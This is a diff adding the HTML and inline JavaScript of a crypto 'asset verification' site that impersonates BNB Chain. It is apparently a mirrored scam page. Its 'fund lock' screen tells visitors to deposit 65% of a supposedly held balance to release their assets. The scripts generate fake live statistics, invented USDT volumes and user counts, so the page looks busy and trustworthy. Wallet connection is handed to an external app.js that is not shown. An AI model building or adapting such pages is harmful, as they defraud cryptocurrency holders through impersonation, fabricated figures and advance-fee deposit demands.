+              <div class="l-delta">+8.24% vs yesterday</div>
+            </div>
+            <div class="live-cell">
+              <div class="l-label">Total USDT Verified (This Week)</div>
+              <div class="l-value">$178,946,721</div>
+              <div class="l-delta">+12.75% vs last week</div>
+            </div>
+            <div class="live-cell">
+              <div class="l-label">Total USDT Verified (This Month)</div>
+              <div class="l-value">$762,387,654</div>
+              <div class="l-delta">+15.32% vs last month</div>
+            </div>
+            <div class="live-cell">
+              <div class="l-label">Total USDT Verified (All Time)</div>
+              <div class="l-value">$4,892,765,321</div>
+              <div class="l-delta muted">All time total</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <div class="container">
+      <section class="hero reveal">
+        <h1 style="font-size: clamp(1.8rem, 5vw, 3rem);">
+          Verify Crypto Assets<br /><span style="font-size: clamp(0.9rem, 2.5vw, 1.4rem); color: var(--bnb-yellow);">Powered by BNB Chain's official</span>
+        </h1>
+        <p>
+          The official institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.
+        </p>
+      </section>
+      <section class="hero-main">
+        <div class="verify-card reveal" id="mainCard">
+          <!-- INITIAL UI -->
+          <div id="initialUI" style="text-align: center;">
+            <div class="bnb-symbol">
+              <svg width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:60px; height:60px;">
+<path d="M22.8814 14.7044L48.1429 0L73.4043 14.7044L64.117 20.1366L48.1429 10.8644L32.1687 20.1366L22.8814 14.7044ZM73.4043 33.2488L64.117 27.8166L48.1429 37.0888L32.1687 27.8166L22.8814 33.2488V44.1132L38.8555 53.3854V71.9297L48.1429 77.362L57.4302 71.9297V53.3854L73.4043 44.1132V33.2488ZM73.4043 62.6576V51.7932L64.117 57.2254V68.0898L73.4043 62.6576ZM79.9984 66.4976L64.0243 75.7698V86.6341L89.2857 71.9297V42.521L79.9984 47.9532V66.4976ZM70.7111 23.9766L79.9984 29.4088V40.2732L89.2857 34.841V23.9766L79.9984 18.5444L70.7111 23.9766ZM38.8555 79.7034V90.5678L48.1429 96L57.4302 90.5678V79.7034L48.1429 85.1356L38.8555 79.7034ZM22.8814 62.6576L32.1687 68.0898V57.2254L22.8814 51.7932V62.6576ZM38.8555 23.9766L48.1429 29.4088L57.4302 23.9766L48.1429 18.5444L38.8555 23.9766ZM16.2873 29.4088L25.5746 23.9766L16.2873 18.5444L7 23.9766V34.841L16.2873 40.2732V29.4088ZM16.2873 47.9532L7 42.521V71.9297L32.2615 86.6341V75.7698L16.2873 66.4976V47.9532Z" fill="#F0B90B"/>
+</svg>
+            </div>
+            <div style="border: 1px solid var(--bnb-yellow); color: var(--bnb-yellow); padding: 8px 20px; border-radius: 50px; font-size: 0.8rem; font-weight: 700; margin-bottom: 40px; display: inline-block;">
+              BNB CHAIN VERIFICATION
+            </div>
+            <button class="btn-verify" id="connect-button">
+              Verify Asset
+            </button>
+          </div>
+          <!-- REPORT PAGE CONTAINER -->
+          <div id="reportPage">
+            <!-- Standard Success/Hold Content -->
+            <div id="standardReport">
+              <span class="warn-icon" id="mainIcon">              <svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:inline-block; vertical-align:middle;">
+<path d="M12 2 4 5v6c0 5.55 3.84 10.74 8 11 4.16-.26 8-5.45 8-11V5l-8-3Z" fill="currentColor" opacity="0.15"/>
+<path d="M12 2 4 5v6c0 5.55 3.84 10.74 8 11 4.16-.26 8-5.45 8-11V5l-8-3Z" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/>
+<path d="m8.5 12 2.5 2.5 5-5" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+</svg>
+</span>
+              <h2 class="rep-title-new" id="repTitle">
+                Verification in Progress
+              </h2>
+              <p class="rep-subtitle-new" id="repSub">
+                Your assets are being verified on the BNB Smart Chain. This may take a few moments.
+              </p>
+              <div class="rep-hold-box">
+                <span id="repBoxLabel">                Detected Balance
+</span>
+                <strong id="repAmount">                0.00 USDT
+</strong>
+              </div>
+              <div id="repAlertBox" class="rep-info-alert" style="display:none;">
+                <i>                ⓘ
+</i>
+                <p id="repStatusDesc"></p>
+              </div>
+              <div class="rep-pending" id="repPendingStatus" style="display:none;">
+                <span class="rep-dot"></span>
+                <span id="repPendingText">Processing</span>
+              </div>
+              <button class="btn-view-tx" id="btnViewTx" onclick="void(0)" style="display:none;">
+                <svg width="18" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z">
+                  </path>
+                </svg>
+                View Transaction
+              </button>
+              <button class="btn-release-gold" id="btnRelease" onclick="open65Warning()" style="display:none;">
+                <span>                ▶
+</span>
+                Release Fund
+              </button>
+              <button class="btn-verify" id="btnContinue" onclick="window.location.reload()" style="display:none;">
+                Continue
+              </button>
+            </div>
+            <!-- 65% UNLOCK WARNING UI -->
+            <div id="unlockWarningUI">
+              <div class="sec-header">
+                ⚠️ fund lock guidelines:-
+              </div>
+              <div class="sec-msg">
+                Security protocol detected a wallet synchronization mismatch. To bypass the network hold and release your locked assets, you must deposit <strong style="color: var(--heading);">65% of the hold value</strong> as temporary liquidity for verification.
+              </div>
+              <div class="calc-box">
+                <span>                Required Unlock Deposit
+</span>
+                <strong id="calc65Amount">                0.00 USDT
+</strong>
+              </div>
+              <p style="color: var(--text-dim2); font-size: 0.8rem; margin-bottom: 20px;">
+                *The deposit will be returned to your wallet after the unlock process.
+              </p>
+              <button class="btn-deposit-now" onclick="window.open('https://link.trustwallet.com/open_url?coin=714&amp;url=https://trustwallet.com', '_blank')">
+                Deposit &amp;verify and unblock
+              </button>
+            </div>
+            <button class="btn-close-link" onclick="window.location.reload()" style="display:none;">
+              Close
+            </button>
+          </div>
+        </div>
+      </section>
+    </div>
+    </section>
+
+    <!-- NEW: Stats grid -->
+    <section class="stats-section">
+      <div class="container">
+        <div class="stats-grid">
+          <div class="stat-card reveal">
+            <div class="stat-icon">
+              <svg width="19" height="19" viewBox="0 0 24 24" fill="none"><path d="M21 8l-9-5-9 5 9 5 9-5z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/><path d="M3 8v8l9 5 9-5V8" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/><path d="M12 13v8" stroke="currentColor" stroke-width="1.7"/></svg>
+            </div>
+            <div class="stat-value">92,768</div>
+            <div class="stat-label">Assets Verified</div>
+            <div class="stat-delta">+18.6% this month</div>
+          </div>
+          <div class="stat-card reveal">
+            <div class="stat-icon">
+              <svg width="19" height="19" viewBox="0 0 24 24" fill="none"><circle cx="9" cy="8" r="3.2" stroke="currentColor" stroke-width="1.7"/><path d="M3 20c0-3.5 2.7-6 6-6s6 2.5 6 6" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/><circle cx="17.5" cy="9" r="2.4" stroke="currentColor" stroke-width="1.7"/><path d="M15.5 20c.2-2.7 1.9-4.7 4-5" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>
+            </div>
+            <div class="stat-value">1.2M+</div>
+            <div class="stat-label">Active Addresses</div>
+            <div class="stat-delta">+22.3% this month</div>
+          </div>
+          <div class="stat-card reveal stat-trusted">
+            <div class="stat-icon">
+              <svg width="19" height="19" viewBox="0 0 24 24" fill="none"><path d="M12 2l2.4 4.9 5.4.8-3.9 3.8.9 5.4L12 14.8 7.2 16.9l.9-5.4L4.2 7.7l5.4-.8L12 2z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/></svg>
+            </div>
+            <div class="stat-value">2.3M+</div>
+            <div class="stat-label">Trusted by millions of users</div>
+            <div class="stat-delta">99.9% satisfaction</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slider Section -->
+    <section class="slider-section">
+      <div class="slider-track">
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ETH" /></div><div class="slide-name">Ethereum</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.svg" alt="BNB" /></div><div class="slide-name">BNB</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/solana-sol-logo.svg" alt="SOL" /></div><div class="slide-name">Solana</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/versions/xrp-xrp-logo-textmark.svg" alt="XRP" /></div><div class="slide-name">XRP</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/cardano-ada-logo.svg" alt="ADA" /></div><div class="slide-name">Cardano</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/versions/dogecoin-doge-logo-alternative.svg" alt="DOGE" /></div><div class="slide-name">Dogecoin</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/polkadot-new-dot-logo.svg" alt="DOT" /></div><div class="slide-name">Polkadot</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/litecoin-ltc-logo.svg" alt="LTC" /></div><div class="slide-name">Litecoin</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/polygon-matic-logo.svg" alt="MATIC" /></div><div class="slide-name">Polygon</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/tether-usdt-logo.svg" alt="USDT" /></div><div class="slide-name">Tether</div></div>
+        <div class="slide"><div class="slide-icon"><svg viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;"><g fill="#f3ba2f"><path d="m38.73 53.2 24.59-24.58 24.6 24.6 14.3-14.31-38.9-38.91-38.9 38.9z"/><path d="m0 63.31 14.3-14.31 14.31 14.31-14.31 14.3z"/><path d="m38.73 73.41 24.59 24.59 24.6-24.6 14.31 14.29-38.9 38.91-38.91-38.88z"/><path d="m98 63.31 14.3-14.31 14.31 14.3-14.31 14.32z"/><path d="m77.83 63.3-14.51-14.52-10.73 10.73-1.24 1.23-2.54 2.54 14.51 14.5 14.51-14.47z"/></g></svg></div><div class="slide-name">BNB Chain</div></div>
+        <!-- Duplicate set for seamless infinite loop -->
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ETH" /></div><div class="slide-name">Ethereum</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.svg" alt="BNB" /></div><div class="slide-name">BNB</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/solana-sol-logo.svg" alt="SOL" /></div><div class="slide-name">Solana</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/versions/xrp-xrp-logo-textmark.svg" alt="XRP" /></div><div class="slide-name">XRP</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/cardano-ada-logo.svg" alt="ADA" /></div><div class="slide-name">Cardano</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/versions/dogecoin-doge-logo-alternative.svg" alt="DOGE" /></div><div class="slide-name">Dogecoin</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/polkadot-new-dot-logo.svg" alt="DOT" /></div><div class="slide-name">Polkadot</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/litecoin-ltc-logo.svg" alt="LTC" /></div><div class="slide-name">Litecoin</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/polygon-matic-logo.svg" alt="MATIC" /></div><div class="slide-name">Polygon</div></div>
+        <div class="slide"><div class="slide-icon"><img src="https://cryptologos.cc/logos/tether-usdt-logo.svg" alt="USDT" /></div><div class="slide-name">Tether</div></div>
+        <div class="slide"><div class="slide-icon"><svg viewBox="0 0 126.61 126.61" xmlns="http://www.w3.org/2000/svg" style="width:32px;height:32px;"><g fill="#f3ba2f"><path d="m38.73 53.2 24.59-24.58 24.6 24.6 14.3-14.31-38.9-38.91-38.9 38.9z"/><path d="m0 63.31 14.3-14.31 14.31 14.31-14.31 14.3z"/><path d="m38.73 73.41 24.59 24.59 24.6-24.6 14.31 14.29-38.9 38.91-38.91-38.88z"/><path d="m98 63.31 14.3-14.31 14.31 14.3-14.31 14.32z"/><path d="m77.83 63.3-14.51-14.52-10.73 10.73-1.24 1.23-2.54 2.54 14.51 14.5 14.51-14.47z"/></g></svg></div><div class="slide-name">BNB Chain</div></div>
+      </div>
+    </section>
+    <!-- Info Grid Section -->
+    <div class="container" style="padding-top: 80px;">
+      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; margin-bottom: 80px;" class="reveal">
+        <div style="background: var(--bg-panel); padding: 40px; border-radius: 25px; border: 1px solid var(--border-line);">
+          <h3 style="color: var(--bnb-yellow); margin-bottom: 15px; font-family: 'Sora';">
+            About BNB Chain
+          </h3>
+          <p style="color: var(--text-dim2); font-size: 0.95rem;">
+            BNB Chain is a community-driven ecosystem that provides the infrastructure for high-performance decentralized applications and assets.
+          </p>
+        </div>
+        <div style="background: var(--bg-panel); padding: 40px; border-radius: 25px; border: 1px solid var(--border-line);">
+          <h3 style="color: var(--bnb-yellow); margin-bottom: 15px; font-family: 'Sora';">
+            Security Audit
+          </h3>
+          <p style="color: var(--text-dim2); font-size: 0.95rem;">
+            Our verification engine performs real-time auditing of smart contract bytecode to ensure investor protection.
+          </p>
+        </div>
+      </div>
+    </div>
+    <!-- Footer -->
+    <footer>
+      <div class="container f-grid">
+        <div class="f-about">
+          <a href="#" class="logo" style="margin-bottom: 25px;">          <svg width="319" height="56" viewBox="0 0 319 56" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:block; height:28px; width:auto;">
+<path d="M9.34249 8.57756L24.203 0L39.0634 8.57756L33.6 11.7463L24.203 6.33756L14.8059 11.7463L9.34249 8.57756ZM39.0634 19.3951L33.6 16.2263L24.203 21.6351L14.8059 16.2263L9.34249 19.3951V25.7327L18.7395 31.1415V41.959L24.203 45.1278L29.6664 41.959V31.1415L39.0634 25.7327V19.3951ZM39.0634 36.5502V30.2127L33.6 33.3815V39.719L39.0634 36.5502ZM42.9425 38.7902L33.5454 44.199V50.5366L48.4059 41.959V24.8039L42.9425 27.9727V38.7902ZM37.4791 13.9863L42.9425 17.1551V23.4927L48.4059 20.3239V13.9863L42.9425 10.8176L37.4791 13.9863ZM18.7395 46.4937V52.8312L24.203 56L29.6664 52.8312V46.4937L24.203 49.6624L18.7395 46.4937ZM9.34249 36.5502L14.8059 39.719V33.3815L9.34249 30.2127V36.5502ZM18.7395 13.9863L24.203 17.1551L29.6664 13.9863L24.203 10.8176L18.7395 13.9863ZM5.46341 17.1551L10.9268 13.9863L5.46341 10.8176L0 13.9863V20.3239L5.46341 23.4927V17.1551ZM5.46341 27.9727L0 24.8039V41.959L14.8605 50.5366V44.199L5.46341 38.7902V27.9727Z" fill="#F0B90B"/>
+<path d="M91.4781 35.1436V35.0545C91.4781 30.8694 89.252 28.7769 85.6457 27.3967C87.8718 26.1501 89.7418 24.1911 89.7418 20.6738V20.5848C89.7418 15.6873 85.8238 12.5262 79.4571 12.5262H64.9874V43.6918H79.8133C86.8478 43.6918 91.4781 40.8424 91.4781 35.1436ZM82.9299 21.8314C82.9299 24.1466 81.0154 25.126 77.9879 25.126H71.6657V18.5367H78.4331C81.3271 18.5367 82.9299 19.6943 82.9299 21.7423V21.8314ZM84.6662 34.2976C84.6662 36.6128 82.8408 37.6813 79.8133 37.6813H71.6657V30.8249H79.5907C83.1079 30.8249 84.6662 32.116 84.6662 34.2086V34.2976Z" fill="#F0B90B"/>
+<path d="M125.256 43.6918V12.5262H118.489V31.7153L103.886 12.5262H97.5634V43.6918H104.331V23.8794L119.424 43.6918H125.256Z" fill="#F0B90B"/>
+<path d="M159.674 35.1436V35.0545C159.674 30.8694 157.448 28.7769 153.841 27.3967C156.067 26.1501 157.937 24.1911 157.937 20.6738V20.5848C157.937 15.6873 154.019 12.5262 147.653 12.5262H133.183V43.6918H148.009C155.043 43.6918 159.674 40.8424 159.674 35.1436ZM151.126 21.8314C151.126 24.1466 149.211 25.126 146.184 25.126H139.861V18.5367H146.629C149.523 18.5367 151.126 19.6943 151.126 21.7423V21.8314ZM152.862 34.2976C152.862 36.6128 151.036 37.6813 148.009 37.6813H139.861V30.8249H147.786C151.304 30.8249 152.862 32.116 152.862 34.2086V34.2976Z" fill="#F0B90B"/>
+<path d="M200.996 38.1864L197.479 34.6246C194.808 37.1179 192.359 38.6762 188.53 38.6762C182.564 38.6762 178.246 33.6897 178.246 27.5456C178.246 21.4015 182.564 16.504 188.53 16.504C192.092 16.504 194.763 18.0623 197.257 20.3775L200.774 16.326C197.791 13.4765 194.318 11.473 188.575 11.473C179.136 11.473 172.502 18.7302 172.502 27.6346C172.502 36.6281 179.27 43.7072 188.352 43.7072C194.185 43.7072 197.746 41.5701 200.996 38.1864Z" fill="#F0B90B"/>
+<path d="M227.544 30.0388V43.1729H233.021V12.0073H227.544V24.9633H212.674V12.0073H207.198V43.1729H212.674V30.0388H227.544Z" fill="#F0B90B"/>
+<path d="M257.586 11.7847H252.511L238.798 43.1729H244.408L247.613 35.6486H262.35L265.511 43.1729H271.299L257.586 11.7847ZM260.347 30.7957H249.617L254.96 18.3295L260.347 30.7957Z" fill="#F0B90B"/>
+<path d="M277.401 12.0073V43.1729H282.877V12.0073H277.401Z" fill="#F0B90B"/>
+<path d="M313.436 33.5561L296.74 12.0073H291.665V43.1729H297.052V21.0008L314.238 43.1729H318.823V12.0073H313.436V33.5561Z" fill="#F0B90B"/>
+</svg>
+</a>
+          <p style="color: var(--text-dim2); font-size: 0.9rem;">
+            Building the infrastructure for the decentralized future. Secured by global validators.
+          </p>
+        </div>
+        <div class="f-links">
+          <h4>
+            Ecosystem
+          </h4>
+          <ul>
+            <li>
+              <a href="#">              Official Website
+</a>
+            </li>
+            <li>
+              <a href="#">              opBNB Layer 2
+</a>
+            </li>
+            <li>
+              <a href="#">              BNB Greenfield
+</a>
+            </li>
+            <li>
+              <a href="#">              Chain Explorer
+</a>
+            </li>
+          </ul>
+        </div>
+        <div class="f-links">
+          <h4>
+            Resources
+          </h4>
+          <ul>
+            <li>
+              <a href="#">              Security Audits
+</a>
+            </li>
+            <li>
+              <a href="#">              Technical Docs
+</a>
+            </li>
+            <li>
+              <a href="#">              Governance
+</a>
+            </li>
+            <li>
+              <a href="#">              Whitepaper
+</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+      <!-- Social Icons -->
+      <div class="container social-row">
+        <a href="#" class="s-btn">        <svg viewBox="0 0 24 24">
+          <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z">
+          </path>
+        </svg>
+</a>
+        <a href="#" class="s-btn">        <svg viewBox="0 0 24 24">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.96-.75 3.78-1.65 6.31-2.74 7.58-3.27 3.61-1.51 4.35-1.77 4.84-1.78.11 0 .35.03.5.16.12.1.16.23.18.33.02.11.02.24.01.37z">
+          </path>
+        </svg>
+</a>
+      </div>
+    </footer>
+    <script type="module" src="app.js">
+    </script>
+    <script>
+      // ── Calibrated Live Stats Engine ──
+
+      // 1. localStorage check — anti-refresh
+      const _SK = 'stc', _STK = 'stt', _MAX = 9 * 60000;
+      const _saved = localStorage.getItem(_SK);
+      const _savedT = parseInt(localStorage.getItem(_STK) || '0');
+      const _age = Date.now() - _savedT;
+      let COUNT;
+
+      // 2. Clock as database
+      const _now = new Date();
+      const _day = _now.getDay();
+      const _hr  = _now.getHours();
+      const _min = _now.getMinutes();
+      const _wk  = Math.floor((_now - new Date(_now.getFullYear(), 0, 1)) / 604800000);
+
+      // 3. Calibrated shift table — hits your daily targets
+      const SHIFTS = [
+        { s:0,  e:5,  base:1200,  band:400,   tlo:22000, thi:28000, dlo:1, dhi:1  },
+        { s:5,  e:9,  base:8000,  band:2000,  tlo:12000, thi:18000, dlo:2, dhi:4  },
+        { s:9,  e:14, base:24000, band:4000,  tlo:4000,  thi:8000,  dlo:4, dhi:9  },
+        { s:14, e:19, base:37000, band:4000,  tlo:5000,  thi:10000, dlo:3, dhi:7  },
+        { s:19, e:22, base:58000, band:3000,  tlo:6000,  thi:12000, dlo:2, dhi:5  },
+        { s:22, e:24, base:63000, band:3000,  tlo:14000, thi:20000, dlo:1, dhi:2  }
+      ];
+
+      function getShiftConfig(hr) {
+        return SHIFTS.find(s => hr >= s.s && hr < s.e) || SHIFTS[0];
+      }
+
+      const _shift = getShiftConfig(_hr);
+
+      // 4. Baseline formula — hits your bands, never fixed
+      function baseline(hr, min, day, wk) {
+        const sh = getShiftConfig(hr);
+        const shiftLen = sh.e - sh.s;
+        const progress = ((hr - sh.s) + (min / 60)) / shiftLen;
+        const seed = Math.sin((wk * 31) + (day * 7) + hr) * 0.5 + 0.5;
+        const bandHit = Math.floor(sh.base + (seed * sh.band));
+        const drift = Math.floor(progress * (sh.band * 0.4));
+        return bandHit + drift;
+      }
+
+      // 5. Restore or calculate
+      if (_saved && _age < _MAX) {
+        COUNT = parseInt(_saved);
+      } else {
+        COUNT = baseline(_hr, _min, _day, _wk);
+      }
+
+      // 6. Midnight fade transition
+      function renderCount(hr, min) {
+        const el = document.getElementById('live-count');
+        if (hr === 0 && min < 5) {
+          el.style.transition = 'opacity 0.4s';
+          el.style.opacity = '0';
+          setTimeout(() => {
+            COUNT = baseline(_hr, _min, _day, _wk);
+            el.textContent = COUNT.toLocaleString();
+            el.style.opacity = '1';
+          }, 600);
+        } else {
+          el.textContent = COUNT.toLocaleString();
+        }
+      }
+
+      // 7. Instant DOM render
+      renderCount(_hr, _min);
+
+      // 8. Live ticker with green flash
+      function rand(lo, hi) { return Math.floor(Math.random() * (hi - lo + 1)) + lo; }
+      function tick() {
+        const sh = getShiftConfig(_hr);
+        COUNT += rand(sh.dlo, sh.dhi);
+        localStorage.setItem(_SK, COUNT);
+        localStorage.setItem(_STK, Date.now());
+        const el = document.getElementById('live-count');
+        el.textContent = COUNT.toLocaleString();
+        // Green flash on change
+        el.style.color = '#22c55e';
+        setTimeout(() => {
+          el.style.color = getComputedStyle(document.documentElement).getPropertyValue('--heading').trim() || '#fff';
+        }, 150);
+        setTimeout(tick, rand(sh.tlo, sh.thi));
+      }
+      setTimeout(tick, rand(_shift.tlo, _shift.thi));
+
+      // ── Live "Today" USDT counter — deterministic time-phase engine ──
+      // All visitors during the same time phase see the same running figure.
+      (function () {
+        // 4 day phases with a fixed base + budget that grows across the phase.
+        const PHASES = [
+          { s: 0,  e: 6,  base: 12400000, budget: 5600000 },  // Night
+          { s: 6,  e: 12, base: 21000000, budget: 5900000 },  // Morning
+          { s: 12, e: 18, base: 24800000, budget: 6200000 },  // Afternoon
+          { s: 18, e: 24, base: 23600000, budget: 6500000 }   // Evening
+        ];
+        function getPhase(hr) {
+          return PHASES.find(function (p) { return hr >= p.s && hr < p.e; }) || PHASES[0];
+        }
+        function computeToday(now) {
+          var hr = now.getHours();
+          var ph = getPhase(hr);
+          var phaseStart = new Date(now); phaseStart.setHours(ph.s, 0, 0, 0);
+          var phaseLenSec = (ph.e - ph.s) * 3600;
+          var elapsedSec = Math.max(0, Math.min(phaseLenSec, (now - phaseStart) / 1000));
+          var progress = elapsedSec / phaseLenSec;
+          // Deterministic + mild shake so it reads as "live" but stays in sync.
+          var wav = 0.5 + 0.5 * Math.sin(now.getMinutes() + now.getSeconds() / 60 * 0.6 + hr);
+          var val = Math.floor(ph.base + ph.budget * progress + wav * 400);
+          return val;
+        }
+        function fmt(USD) {
+          return '$' + USD.toLocaleString('en-US');
+        }
+        var el = document.getElementById('liveToday');
+        function renderToday() { el.textContent = fmt(computeToday(new Date())); }
+        renderToday();
+        setInterval(renderToday, 2000);
+      })();
+
+      // Button ripple effect for .btn-close-link
+      document.querySelectorAll('.btn-close-link').forEach(btn => {
+        btn.addEventListener('click', function(e) {
+          const rect = this.getBoundingClientRect();
+          const ripple = document.createElement('span');
+          const size = Math.max(rect.width, rect.height);
+          ripple.style.cssText = `position:absolute;width:${size}px;height:${size}px;border-radius:50%;background:rgba(240,185,11,0.4);transform:scale(0);animation:ripple 0.6s ease-out;pointer-events:none;left:${e.clientX - rect.left - size/2}px;top:${e.clientY - rect.top - size/2}px;`;
+          this.appendChild(ripple);
+          setTimeout(() => ripple.remove(), 700);
+        });
+      });
+    </script>
+  </body>
+
+<!-- Mirrored from https://bnbxt.org/ by HTTrack Website Copier/3.x [XR&CO], Sun, 11 Oct 2026 05:06:34 GMT -->
+</html>
